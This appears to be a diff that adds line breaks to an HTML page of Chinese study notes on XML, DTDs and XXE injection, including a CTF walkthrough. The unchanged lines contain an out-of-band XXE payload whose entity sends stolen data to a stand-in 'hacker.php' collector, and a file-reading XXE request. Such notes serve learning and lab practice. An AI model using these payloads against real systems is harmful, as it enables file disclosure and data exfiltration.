@@ -7704,10 +7704,10 @@
 <h3 id="xml">XML介绍</h3>
 <p>xml指可拓展标记语言，用来传输和存储数据，没有预定义标签，允许作者定义自己的标签和文档结构</p>
 <h3 id="_3">语法规则</h3>
-<p>XML必须有一个根元素
-XML元素必须有一个关闭标签
-XML标签对大小敏感
-XML元素必须被正确嵌套
+<p>XML必须有一个根元素<br />
+XML元素必须有一个关闭标签<br />
+XML标签对大小敏感<br />
+XML元素必须被正确嵌套<br />
 XML属性值必须加引导</p>
 <p>例如：</p>
 <pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
@@ -7755,7 +7755,7 @@ foreach ($xml as $key =&gt; $value) {
 </tbody>
 </table>
 <h3 id="dtd">DTD文档类型定义</h3>
-<p>DTD文档类型定义作用是定义XML文档的合法构建模块
+<p>DTD文档类型定义作用是定义XML文档的合法构建模块<br />
 DTD可以在XML文档内部声明，也可以外部引用</p>
 <pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
 &lt;!DOCTYPE note[
@@ -7773,7 +7773,7 @@ DTD可以在XML文档内部声明，也可以外部引用</p>
 &lt;/note&gt;
 </code></pre>
 <p>PCDATA的意思是是被解析的字符串数据，PCDATA是会被解析器解析的文本。这些文本将会被解析器检查实体以标记，文本中的标签会被当作标记来处理，而实体会被展开</p>
-<p>在声明中这样可以定义变量<strong>&lt;!ENEITY 变量名 "变量内容"&gt;</strong>
+<p>在声明中这样可以定义变量<strong>&lt;!ENEITY 变量名 "变量内容"&gt;</strong><br />
 在XML文档里引用<strong>&amp;变量名;</strong></p>
 <pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;
 &lt;!DOCTYPE note[
@@ -7796,7 +7796,7 @@ DTD可以在XML文档内部声明，也可以外部引用</p>
 </code></pre>
 <p><img alt="image.png" src="../img/551828_ueze8i1qtgg20el0/1565424535803-9d5b2f48-df9e-4725-9ffe-1523fa6df499-434036.png" /></p>
 <p>XML文档规定：只有在DTD中才能引用参数实体，参数实体的引用和声明都是以%开头的</p>
-<p><strong>下面三个实验源码没有完善，还不行</strong>
+<p><strong>下面三个实验源码没有完善，还不行</strong><br />
 1.xml</p>
 <pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
 &lt;!DOCTYPE foo [
@@ -7808,7 +7808,7 @@ DTD可以在XML文档内部声明，也可以外部引用</p>
 ]&gt;
 &lt;foo&gt;&amp;send;&lt;/foo&gt;
 </code></pre>
-<p>dtd2.xml
+<p>dtd2.xml<br />
 xml不允许实体再去引用实体，所以不能把data2.xml写在文档里而要外部引用</p>
 <pre><code class="language-xml">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM 'http://127.0.0.1/php/xxe/hacker.php?cookie=%evil;'&gt;&quot;&gt;
 </code></pre>
@@ -7823,9 +7823,9 @@ fclose($fp);
 </code></pre>
 <h2 id="_5">例题</h2>
 <p>http://web.jarvisoj.com:9882</p>
-<p>搜索框传递的格式是json改为xml，就可以读文件
+<p>搜索框传递的格式是json改为xml，就可以读文件<br />
 <img alt="image.png" src="../img/551828_ueze8i1qtgg20el0/1565482816260-8527d0df-4985-488c-b0e6-6ca5841a668d-389037.png" /></p>
-<p>思路：
+<p>思路：<br />
 告诉了flag的位置，并且是在非apache解析目录相下，想读取文件，要么 getshell，要么文件读取</p>
 <p>在发请求过程实现文件读取 -&gt; XXE</p>
 <pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
@@ -7838,7 +7838,7 @@ fclose($fp);
 &lt;/note&gt;
 </code></pre>
 <h2 id="xxe-lab">xxe-lab</h2>
-<p><a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a>
+<p><a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a><br />
 直接放到 phpstudy 的 WWW 目录下</p>
 <blockquote>
 <p>原文: <a href="https://www.yuque.com/hxfqg9/web/iai2tr">https://www.yuque.com/hxfqg9/web/iai2tr</a></p>
